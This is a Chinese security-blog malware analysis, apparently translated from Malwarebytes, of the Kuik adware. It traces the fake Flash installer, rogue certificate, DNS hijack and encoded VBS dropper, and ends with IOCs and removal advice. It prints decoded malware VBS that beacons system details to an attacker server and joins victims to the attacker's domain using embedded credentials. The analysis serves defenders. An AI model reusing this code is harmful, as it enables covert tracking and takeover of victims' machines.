**某些恶意软件虽然非常简单，但一旦被感染上之后我们往往需要耗费很大的精力才能将其清除，尤其是当它们开始干扰你系统配置时。最近我们的安全研究团队，就发现了这样一款名为Kuik的恶意广告软件。攻击者正试图利用这种独特的技术手法，将谷歌浏览器扩展程序和数字货币矿工应用推送给受害者。在本文中，我们将对该恶意广告软件做进一步的技术分析，以及为大家提供相关的移除说明。**

## 技术说明

### Stage 1 – .NET installer

[0ba20fee958b88c48f3371ec8d8a8e5d](https://www.virustotal.com/#/file/b9323268bf81778329b8316dec8f093fe71104f16921a1c9358f7ba69dd52686/details)

第一阶段是使用.NET编写的伪造Adobe Flash Player图标的应用。这是典型的恶意捆绑，伪装成Adobe Flash
Player更新程序欺骗用户安装。

![1plug_dotnet.png](https://image.3001.net/images/20180511/15259955447839.png!small)

我们使用dotNet反编译器（即dnSpy）打开后发现，该项目的原始名称为WWVaper。

![2project.png](https://image.3001.net/images/20180511/15259955631373.png!small)

它有三个内部资源：

> 证书（svr.crt）
>
> 一个合法的Flash（诱饵）
>
> 下一阶段组件（upp.exe）

![3resources.png](https://image.3001.net/images/20180511/15259955872021.png!small)

证书：

    
    
    -----BEGIN CERTIFICATE-----    MIIEZjCCA06gAwIBAgIJAPywkVD7m/9XMA0GCSqGSIb3DQEBCwUAMHMxCzAJBgNV
    BAYTAlVTMQswCQYDVQQIDAJOWTERMA8GA1UEBwwITmV3IFlvcmsxFTATBgNVBAoM
    DEV4YW1wbGUsIExMQzEMMAoGA1UEAwwDYWxsMR8wHQYJKoZIhvcNAQkBFhB0ZXN0
    QGV4YW1wbGUuY29tMB4XDTE4MDIxNjIyMjA0M1oXDTE5MDIxNjIyMjA0M1owczEL
    MAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5ZMREwDwYDVQQHDAhOZXcgWW9yazEVMBMG
    A1UECgwMRXhhbXBsZSwgTExDMQwwCgYDVQQDDANhbGwxHzAdBgkqhkiG9w0BCQEW
    EHRlc3RAZXhhbXBsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
    AQDMohZZUrsJOqXS1/eTpGGOMDxEE+YmRLmSU5h/K4tmnkr7Tv9cukICp/Xxnrci
    5ONLdqgQFH1xLxLa6Xo+2X075NS0VjfMPx9WvYPSZ/T7uQQhb8Mc+ojjNoHK0JbD
    oPjiuiGTLllq1AQ34kvQa6k8E7GPjSdrQnPF55+aWAdPSIDcdqxMt1uFOcF0DY4y
    vHNpFw1xsjpYuvw1/MvwITr3A+PdKN9TIMzDgbXTZEtc7rWDah4HtIYSJZ2xwIcH
    qp6xU9FypSV6JnbITlv4gZkUuI2HeiNpSGGd55KOtk5pDhuGeNfLGor6eWcSG6eX
    N6erGBkM7VTfJ5yM9Pxfcu+hAgMBAAGjgfwwgfkwHQYDVR0OBBYEFCZDbmCp6xnU
    3F/U3InMEiuduPEMMB8GA1UdIwQYMBaAFCZDbmCp6xnU3F/U3InMEiuduPEMMAkG
    A1UdEwQCMAAwCwYDVR0PBAQDAgWgMHEGA1UdEQRqMGiCCXlhaG9vLmNvbYINd3d3
    LnlhaG9vLmNvbYIKZ29vZ2xlLmNvbYIOd3d3Lmdvb2dsZS5jb22CCWdvb2dsZS5t
    ZYINd3d3Lmdvb2dsZS5tZYIIYmluZy5jb22CDHd3dy5iaW5nLmNvbTAsBglghkgB
    hvhCAQ0EHxYdT3BlblNTTCBHZW5lcmF0ZWQgQ2VydGlmaWNhdGUwDQYJKoZIhvcN
    AQELBQADggEBAMQm1OHLdcYvQK6aMPgYdOozkDT20DuJ6NZD1Frljjex7NzB7nVm
    AC+3h1huSyqxYGbJQ8J3wLOYRZH+N5GOZUvjwrU+NY5KurWbMj6USMfsWfnnSXQi
    0ADyjYZqtPMmIaIK86yPx4t+3mA8VX5nDRurjKoprTKwaQpxKksZ0kkpitN1epZX
    2g1YJAnjnq/9Ilt3MOCEpoCnUz5E+bgQO9AS9ZQqNryuGFfzjgXxLbYBbyDVknZ0
    2zz4Zzkm2QBCIGi5jigz7VmwmcpIhJPH9QKlCw5Dx+F3mepR01UMaiwEBDGIeSWX
    +joBVMKdqhFu9zChlN0dW0hbViIm+gDYsCQ=
    -----END CERTIFICATE-----
证书详情：

![4cert_info.png](https://image.3001.net/images/20180511/15259956118349.png!small)

证书指向yahoo.com的一个DNS名称。但是，证书路径无效：

![5cert_path.png](https://image.3001.net/images/20180511/15259956302119.png!small)

.NET installer负责安装恶意证书和其他组件。首先，它会枚举网络接口并将收集的IP添加到列表中：

![6enum_interfaces.png](https://image.3001.net/images/20180511/15259956506556.png!small)

然后，它将新的IP作为DNS（[18.219.162.248](https://db-ip.com/all/18.219.162)）添加到收集的接口，并安装自己的证书（svr.crt）：

![7add_cert.png](https://image.3001.net/images/20180511/15259956738195.png!small)

### Stage 2 – upp.exe

[3a13b73f823f081bcdc57ea8cc3140ac](https://www.virustotal.com/#/file/990c019319fc18dca473ac432cdf4c36944b0bce1a447e85ace819300903a79e/details)

此应用是一个未被混淆过的installer bundle。在里面，我们找到了一个cabinet文件：

![8cabinet_res.png](https://image.3001.net/images/20180511/15259956944955.png!small)

它包含要删除的其他模块：

![9cabinet.png](https://image.3001.net/images/20180511/1525995718701.png!small)

应用程序“install.exe”以“setup.bat”作为参数进行部署。

![10setup_bat.png](https://image.3001.net/images/20180511/1525995738446.png!small)

### Stage 3 - 从cabinet中解压缩组件

应用程序install.exe是基本的。它的唯一作用就是在提升模式（ elevated mode）下运行下一个进程。在下面，你可以看到它的main
function：

![11just_run_cmd.png](https://image.3001.net/images/20180511/15259957606575.png!small)

脚本setup.bat部署了另一个名为SqadU9FBEV.bat的组件：

![12setup_bat-1.png](https://image.3001.net/images/20180511/15259957827094.png!small)

它通过ping 127.0.0.1来延迟执行。然后，它会运行第二个被编码的脚本，并为其提供一个活动ID作为参数：

![13squad_bat.png](https://image.3001.net/images/20180511/15259958027393.png!small)

下一个元素被部署为一个编码的VBS脚本：

![14encoded.png](https://image.3001.net/images/20180511/15259958225945.png!small)

在解码后（[解码器](https://master.ayra.ch/vbs/vbs.aspx)），我们可以清楚地看到该脚本的内容：[NYkjVVXepl.vbs](https://gist.github.com/malwarezone/77fdbdd430b78783ac006a0b20bb2d22#file-nykjvvxepl-vbs)。我们还看到了系统指纹和到服务器的信标：

    
    
    Set SystemSet = GetObject("winmgmts:").InstancesOf ("Win32_OperatingSystem") 
    for each System in SystemSet 
      winVer = System.Caption 
    next
    Function trackEvent(eventName, extraData)
      Set tracking = CreateObject("MSXML2.XMLHTTP")
      tracking.open "GET", "http://eventz.win:13463/trk?event=" & eventName & "&computer=" & UUID & "&windows-version=" & winVer & "&error=" & err.Number & ";" & err.Description & ";" & err.Source & ";" & extraData & "&campaign=qavriknzkk&channel=" & WScript.Arguments.Item(0), False
      tracking.send
      err.clear
    End Function

其中有一个非常有意思的片段，就是将受感染的计算机添加到域中：

    
    
    SET objNetwork = CREATEOBJECT("WScript.Network")
    strComputer = objNetwork.ComputerName
    SET objComputer = GetObject("winmgmts:" & "{impersonationLevel=Impersonate,authenticationLevel=Pkt}!\\" & strComputer & "\root\cimv2:Win32_ComputerSystem.Name='" & strComputer & "'")
    ReturnValue = objComputer.JoinDomainOrWorkGroup("kuikdelivery.com", "4sdOwt7b7L1vAKR6U7", "kuikdelivery.com\administrator", "OU=" & WScript.Arguments.Item(0) & ",DC=kuikdelivery,DC=com", JOIN_DOMAIN + ACCT_CREATE + DOMAIN_JOIN_IF_JOINED + JOIN_UNSECURE)
    If (ReturnValue  0) Or (err.number  0) Then
      trackEvent "join-domain-failed", ReturnValue
      WScript.Quit 1
    Else
      trackEvent "join-domain-success", Null
      WScript.Quit 0
    End IF

## Payloads

该程序使用了一系列有效载荷，我们发现攻击者尤其偏爱假冒Chrome浏览器扩展程序。此外，还有一些数字货币矿工正在服务：

![15payloads2.png](https://image.3001.net/images/20180511/15259958432021.png!small)

## 移除

[Malwarebytes](https://www.malwarebytes.com/)用户（版本为3.x）可以通过运行全面扫描从系统中移除此威胁，其中包括取消加入恶意域控制器，并将你的机器恢复到其原始状态。

## IOCs

Kuik

    
    
    b9323268bf81778329b8316dec8f093fe71104f16921a1c9358f7ba69dd52686
    990c019319fc18dca473ac432cdf4c36944b0bce1a447e85ace819300903a79e

Chrome extensions

    
    
    d-and-h[.]com/fljlngkbcebmlpdlojnndahifaocnipb.crx
    d-and-h[.]com/123.crx
    d-and-h[.]com/jpfhjoeaokamkacafjdjbjllgkfkakca.crx
    d-and-h[.]com/mmemdlochnielijcfpmgiffgkpehgimj.crx
    kuikdelivery[.]com/emhifpfmcmoghejbfcbnknjjpifkmddc.crx
    tripan[.]me/kdobijehckphahlmkohehaciojbpmdbp.crx

Payloads

    
    
    92996D9E7275006AB6E59CF4676ACBB2B4C0E0DF59011347CE207B219CB2B751
    33D86ABF26EFCDBD673DA5448C958863F384F4E3E678057D6FAB735968501268
    7889CB16DB3922BEEFB7310B832AE0EF60736843F4AD9FB2BFE9D8B05E48BECD
    761D62A22AE73307C679B096030BF0EEC93555E13DC820931519183CAA9F1B2A
    871AD057247C023F68768724EBF23D00EF842F0B510A3ACE544A8948AE775712

 ***参考来源：[malwarebytes](https://blog.malwarebytes.com/threat-analysis/2018/05/kuik-simple-yet-annoying-piece-adware/)，FB小编 secist
编译，转载请注明来自FreeBuf.COM**  

